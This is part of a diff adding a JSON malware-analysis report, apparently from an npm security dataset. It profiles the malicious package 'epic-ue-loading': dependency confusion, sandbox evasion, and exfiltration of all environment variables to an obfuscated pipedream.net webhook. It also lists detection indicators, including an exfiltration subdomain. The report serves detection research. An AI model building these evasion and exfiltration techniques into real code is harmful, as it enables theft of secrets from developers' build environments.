+                  "similar_legitimate_use": "Some legitimate packages may collect environment data for debugging or telemetry, but only with user consent and transparent documentation. They do not obfuscate hostnames or exfiltrate all environment variables.",
+                  "key_indicators": [
+                    "Access to process.env and exfiltration of all environment variables",
+                    "Obfuscated and dynamically constructed webhook host using string concatenation",
+                    "Base64 encoding of exfiltrated data",
+                    "Network POST request to attacker-controlled domain at import-time",
+                    "Conditional logic to avoid execution in sandboxes"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "build.js (main entry point in malicious versions)",
+                  "required_permissions": [
+                    "environment_vars",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "epic-ue-loading",
+                  "package_manager": "npm",
+                  "package_versions": "1.803.0, 2.802.0, 3.801.0, 4.800.0, 5.799.0, 6.798.0, 7.797.0, 8.796.0, 9.795.0 (malicious); 0.1.0 (benign)",
+                  "why_malicious": "Multiple versions of the package exfiltrate all environment variables to an attacker-controlled webhook, use obfuscated and dynamically constructed hostnames, and implement sandbox evasion techniques to avoid detection. The latest version (0.1.0) is benign to bypass security scanners, while the majority of versions are malicious and designed for dependency confusion attacks targeting build and CI/CD environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a dependency due to dependency confusion, leveraging high minor/patch version numbers to supersede internal packages.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on the victim machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "On import or runtime, the code checks environment variables for known sandbox, CI/CD, or analysis indicators to evade detection.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "If not a sandbox or analysis environment, proceeds to data exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collects all environment variables from the victim machine using process.env.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Prepares sensitive data for exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Exfiltrates the collected environment variables to an attacker-controlled webhook using a POST request to a dynamically constructed subdomain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive credentials and secrets from the victim environment"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to process.env and exfiltration of all environment variables to external domains",
+                    "Network POST requests to dynamically constructed subdomains of pipedream.net at import-time or runtime",
+                    "Conditional logic to evade sandboxes or CI/CD environments based on environment variable checks",
+                    "Obfuscated or programmatically constructed hostnames and filter lists in JavaScript code"
+                  ],
+                  "file_indicators": [
+                    "build.js containing both process.env access and http.request usage",
+                    "Obfuscated or minified code in non-production npm packages",
+                    "Presence of large, programmatically constructed filter lists for environment variable checks in build.js"
+                  ],
+                  "network_indicators": [
+                    "*.m.pipedream.net",
+                    "POST requests to subdomains such as eoxb1lay4m45mms.m.pipedream.net"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access all environment variables and send them to external domains, especially at import-time or during installation. Flag packages with obfuscated or dynamically constructed code, large environment variable filter lists, or network requests to known exfiltration domains such as *.m.pipedream.net. Use both static and dynamic analysis to inspect all package versions, not just the latest, and correlate build.js file contents with suspicious network activity."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/frox-winston-elasticsearch/0.15.7/package/transformer.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
